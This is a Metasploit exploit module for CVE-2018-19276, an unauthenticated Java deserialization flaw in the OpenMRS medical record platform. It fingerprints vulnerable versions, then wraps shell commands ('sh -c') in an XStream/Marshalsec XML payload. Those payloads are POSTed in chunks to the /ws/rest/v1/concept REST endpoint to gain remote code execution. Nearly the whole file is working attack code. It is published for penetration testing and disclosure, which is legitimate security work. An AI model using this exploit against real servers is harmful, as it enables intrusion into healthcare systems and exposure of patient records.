# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;OpenMRS Java Deserialization RCE&#039;,
      &#039;Description&#039;    => %q(
        OpenMRS is an open-source platform that supplies
        users with a customizable medical record system.

        There exists an object deserialization vulnerability
        in the `webservices.rest` module used in OpenMRS Platform.
        Unauthenticated remote code execution can be achieved
        by sending a malicious XML payload to a Rest API endpoint
        such as `/ws/rest/v1/concept`.

        This module uses an XML payload generated with Marshalsec
        that targets the ImageIO component of the XStream library.

        Tested on OpenMRS Platform `v2.1.2` and `v2.21` with Java
        8 and Java 9.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
      [
        &#039;Nicolas Serra&#039;, # Vuln Discovery and PoC
        &#039;mpgn&#039;,          # PoC
        &#039;Shelby Pace&#039;    # Metasploit Module
      ],
      &#039;References&#039;     =>
       [
         [ &#039;CVE&#039;, &#039;2018-19276&#039; ],
         [ &#039;URL&#039;, &#039;https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607&#039; ],
         [ &#039;URL&#039;, &#039;https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization&#039; ],
         [ &#039;URL&#039;, &#039;https://github.com/mpgn/CVE-2018-19276/&#039; ]
       ],
      &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
       [
         [ &#039;Linux&#039;,
           {
             &#039;Arch&#039;             =>  [ ARCH_X86, ARCH_X64 ],
             &#039;Platform&#039;         =>  [ &#039;unix&#039;, &#039;linux&#039; ],
             &#039;CmdStagerFlavor&#039;  => &#039;printf&#039;
           }
         ]
       ],
      &#039;DisclosureDate&#039; => &#039;2019-02-04&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
    [
      Opt::RPORT(8081),
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base URI for OpenMRS&#039;, &#039;/&#039; ])
    ])

    register_advanced_options([ OptBool.new(&#039;ForceExploit&#039;, [ false, &#039;Override check result&#039;, false ]) ])
  end

  def check
    res = send_request_cgi!(&#039;method&#039; => &#039;GET&#039;, &#039;uri&#039; => normalize_uri(target_uri.path))
    return CheckCode::Unknown("OpenMRS page unreachable.") unless res

    return CheckCode::Safe(&#039;Page discovered is not OpenMRS.&#039;) unless res.body.downcase.include?(&#039;openmrs&#039;)
    response = res.get_html_document
    version = response.at(&#039;body//h3&#039;)
    return CheckCode::Detected(&#039;Successfully identified OpenMRS, but cannot detect version&#039;) unless version && version.text

    version_no = version.text
    version_no = version_no.match(/\d+\.\d+\.\d*/)
    return CheckCode::Detected(&#039;Successfully identified OpenMRS, but cannot detect version&#039;) unless version_no

    version_no = Gem::Version.new(version_no)

    if (version_no < Gem::Version.new(&#039;1.11.8&#039;) || version_no.between?(Gem::Version.new(&#039;2&#039;), Gem::Version.new(&#039;2.1.3&#039;)))
      return CheckCode::Appears("OpenMRS platform version: #{version_no}")
    end

    CheckCode::Safe
  end

  def format_payload
    payload_data = payload.encoded.to_s.encode(xml: :text)
    payload_arr = payload_data.split(&#039; &#039;, 3)
    payload_arr.map { |arg| "<string>#{arg}</string>" }.join.gsub("&#039;", "")
  end

  def read_payload_data(payload_cmd)
    # payload generated with Marshalsec
    erb_path = File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2018-19276&#039;, &#039;payload.erb&#039;)
    payload_data = File.binread(erb_path)
    payload_data = ERB.new(payload_data).result(binding)

  rescue Errno::ENOENT
    fail_with(Failure::NotFound, "Failed to find erb file at the given path: #{erb_path}")
  end

  def execute_command(cmd, opts={})
    cmd = cmd.encode(xml: :text)
    xml_data = "<string>sh</string><string>-c</string><string>#{cmd}</string>"
    rest_uri = normalize_uri(target_uri.path, &#039;ws&#039;, &#039;rest&#039;, &#039;v1&#039;, &#039;concept&#039;)
    payload_data = read_payload_data(xml_data)

    send_request_cgi(
      &#039;method&#039;    =>  &#039;POST&#039;,
      &#039;uri&#039;       =>  rest_uri,
      &#039;headers&#039;   =>  { &#039;Content-Type&#039;  =>  &#039;text/xml&#039; },
      &#039;data&#039;      =>  payload_data
    )
  end

  def exploit
    chk_status = check
    print_status(&#039;Target is running OpenMRS&#039;) if chk_status == CheckCode::Appears
    unless ((chk_status == CheckCode::Appears || chk_status == CheckCode::Detected) || datastore[&#039;ForceExploit&#039;] )
      fail_with(Failure::NoTarget, &#039;Target is not vulnerable&#039;)
    end

    cmds = generate_cmdstager(:concat_operator => &#039;&&&#039;)
    print_status(&#039;Sending payload...&#039;)
    cmds.first.split(&#039;&&&#039;).map { |cmd| execute_command(cmd) }
  end
end

